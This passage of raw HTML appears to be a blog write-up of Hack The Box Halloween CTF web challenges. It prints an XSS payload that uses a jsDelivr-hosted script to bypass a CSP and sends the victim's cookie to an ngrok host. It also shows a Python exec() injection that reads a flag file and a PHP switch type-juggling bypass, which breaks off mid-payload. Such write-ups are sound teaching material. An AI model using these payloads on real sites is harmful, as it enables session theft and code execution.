&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://127.0.0.1:1337/admin&amp;#39;&lt;/span&gt;, {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;waitUntil&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;networkidle2&amp;#39;&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;timeout&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt;
		});

		&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://127.0.0.1:1337/admin/delete_all&amp;#39;&lt;/span&gt;, {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;waitUntil&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;networkidle2&amp;#39;&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;timeout&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt;
		});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the index.js file we notice that we have some definitions set for the CSP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setHeader&lt;/span&gt;(
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Security-Policy&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;script-src &amp;#39;self&amp;#39; https://cdn.jsdelivr.net ; style-src &amp;#39;self&amp;#39; https://fonts.googleapis.com; img-src &amp;#39;self&amp;#39;; font-src &amp;#39;self&amp;#39; https://fonts.gstatic.com; child-src &amp;#39;self&amp;#39;; frame-src &amp;#39;self&amp;#39;; worker-src &amp;#39;self&amp;#39;; frame-ancestors &amp;#39;self&amp;#39;; form-action &amp;#39;self&amp;#39;; base-uri &amp;#39;self&amp;#39;; manifest-src &amp;#39;self&amp;#39;&amp;#34;&lt;/span&gt;
    );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We noticed this earlier in our Response as well:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Content-Security-Policy: script-src &#39;self&#39; https://cdn.jsdelivr.net ; style-src &#39;self&#39; https://fonts.googleapis.com; img-src &#39;self&#39;; font-src &#39;self&#39; https://fonts.gstatic.com; child-src &#39;self&#39;; frame-src &#39;self&#39;; worker-src &#39;self&#39;; frame-ancestors &#39;self&#39;; form-action &#39;self&#39;; base-uri &#39;self&#39;; manifest-src &#39;self&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After a little bit of research about CSP and XSS, I found out in the CSP evaluator :&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cdn.jsdelivr.net is known to host JSONP endpoints and Angular libraries which allow to bypass this CSP.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can host an &lt;code&gt;xss.js&lt;/code&gt; file on a GH repository and add something like alert(1). We can finally trigger the alert, but we need to cookie.&lt;/p&gt;
&lt;p&gt;Digging deep enough, i found out this repository: &lt;a href=&#34;https://github.com/CanardMandarin/csp-bypass&#34;&gt;CSP bypass&lt;/a&gt;. It&amp;rsquo;s a simple project that allows the bypass of csp.&lt;/p&gt;
&lt;p&gt;we need to create a script tag that point to that repository and  execute a &amp;ldquo;query&amp;rdquo; to our ngrok.&lt;/p&gt;
&lt;p&gt;Finally we got it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://cdn.jsdelivr.net/gh/canardmandarin/csp-bypass@master/dist/sval-classic.js&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/script&amp;gt;&amp;lt;br csp=&amp;#34;window.location=&amp;#39;[ngrok url]/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;concat&lt;/span&gt;(document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;)&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We got the cookie.
In the &lt;code&gt;JWTHelper.js&lt;/code&gt; file we see how the JWT token is signed. It uses HS256 with a big random hex string .&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;APP_SECRET&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;crypto&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;randomBytes&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#a6e22e&#34;&gt;module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;sign&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;) {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;assign&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;);
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sign&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;APP_SECRET&lt;/span&gt;, { &lt;span style=&#34;color:#a6e22e&#34;&gt;algorithm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HS256&amp;#39;&lt;/span&gt; }))
	},
	&lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;verify&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;) {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;verify&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;APP_SECRET&lt;/span&gt;, { &lt;span style=&#34;color:#a6e22e&#34;&gt;algorithm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HS256&amp;#39;&lt;/span&gt; }));
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finaly we decoded our token using &lt;code&gt;jwt.io&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The flag :&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTB{cdn_c4n_byp4ss_c5p!!}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;evaluation-deck&#34;&gt;Evaluation Deck&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;solution-1&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;We are given the source code for the website, after reading some of the code, I found an API that features an interesting method that supposedly calculates the health of the ghost (in the website) from the given parameters.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;route(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/get_health&amp;#39;&lt;/span&gt;, methods&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;])
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;count&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;is_json:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid JSON!&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;

    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_json()

    current_health &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;current_health&amp;#39;&lt;/span&gt;)
    attack_power &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;attack_power&amp;#39;&lt;/span&gt;)
    operator &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;operator&amp;#39;&lt;/span&gt;)
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; current_health &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; attack_power &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; operator:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;All fields are required!&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;

    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; compile(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;result = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;int(current_health)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;operator&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;int(attack_power)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;string&amp;gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exec&amp;#39;&lt;/span&gt;)
        exec(code, result)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response(result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;result&amp;#39;&lt;/span&gt;))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Something Went Wrong!&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, they are using Python&amp;rsquo;s &lt;code&gt;compile&lt;/code&gt; and &lt;code&gt;exec&lt;/code&gt; function, which can be very dangerous when executed from unsanitized user input.&lt;/p&gt;
&lt;p&gt;We can control all the parameters, but &lt;code&gt;current_health&lt;/code&gt; and &lt;code&gt;attack_power&lt;/code&gt; are converted to int and that limits us to passing only numbers.&lt;/p&gt;
&lt;p&gt;That leaves us with &lt;code&gt;operator&lt;/code&gt; that needs to be added to two numbers. So I tried to find a way to convert the flag into a number which can then be converted back  into the flag itself.&lt;/p&gt;
&lt;p&gt;I ended up converting the flag into &lt;code&gt;ASCII&lt;/code&gt; unicode using the following function :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;ord(character)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So the final payload to be sent as a POST reqeust to api:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[IP]/api/get_health&amp;#34;&lt;/span&gt;, {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;headers&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/json&amp;#34;&lt;/span&gt;,
    },
    &lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;({
      &lt;span style=&#34;color:#a6e22e&#34;&gt;current_health&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;,
      &lt;span style=&#34;color:#a6e22e&#34;&gt;attack_power&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;,
      &lt;span style=&#34;color:#a6e22e&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`+ ord(open(&amp;#34;../../../flag.txt&amp;#34;).read()[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]);`&lt;/span&gt;,
    }),
  })
    .&lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;) =&amp;gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;())
    .&lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;) =&amp;gt; {
      &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
    });
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then I got the result in ascii unicode, so I converted it back to characters using the following function :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;chr(ascii unicode)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The Flag:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;juggling-facts&#34;&gt;Juggling Facts&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;An organization seems to possess knowledge of the true nature of pumpkins. Can you find out what they honestly know and uncover this centuries-long secret once and for all?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;solution-2&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;When i press &lt;code&gt;Secret Facts&lt;/code&gt; it shows : &lt;code&gt;Secrets can only be accessed by admin&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://postimg.cc/VdM7SY9r&#34;&gt;&lt;img src=&#34;https://i.postimg.cc/yYp2bxkP/Screen-Shot-2022-10-28-at-2-47-04-PM.png&#34; alt=&#34;Screen-Shot-2022-10-28-at-2-47-04-PM.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Since this challenge’s name is Juggling Facts, I’ll google php juggling.&lt;/p&gt;
&lt;p&gt;Now, we can dig deeper in this exploit: &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling&#34;&gt;PayloadAllTheThings&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://postimg.cc/SYmPLR6x&#34;&gt;&lt;img src=&#34;https://i.postimg.cc/NFXwcrLm/a5.png&#34; alt=&#34;a5.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It seems like &lt;code&gt;IndexController.php&lt;/code&gt; is vulnerable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($jsondata[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;secrets&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;)
        {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $router&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;jsonify&lt;/span&gt;([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Currently this type can be only accessed through localhost!&amp;#39;&lt;/span&gt;]);
        }

        &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ($jsondata[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;])
        {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;secrets&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $router&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;jsonify&lt;/span&gt;([
                    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;facts&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;facts&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get_facts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;secrets&amp;#39;&lt;/span&gt;)
                ]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The first if statement is NOT vulnerable, as it’s using strict comparison (&lt;code&gt;===&lt;/code&gt;, &lt;code&gt;!==&lt;/code&gt;). So, we have to parse the type &lt;code&gt;POST&lt;/code&gt; parameter.&lt;/p&gt;
&lt;p&gt;However, the &lt;code&gt;switch&lt;/code&gt; statement is vulnerable, According to official &lt;a href=&#34;https://www.php.net/manual/en/control-structures.switch.php&#34;&gt;PHP documentation&lt;/a&gt; switch/case does &lt;a href=&#34;php.net/manual/en/types.comparisons.php#types.comparisions-loose&#34;&gt;loose comparision&lt;/a&gt;.
Since the case secrets is the first item, it can bypass the &lt;code&gt;REMOTE_ADDR&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So the final payload to be sent as a POST reqeust to api:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[IP]/api/getfacts&amp;#39;&lt;/span&gt;, {&lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;headers&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;}, 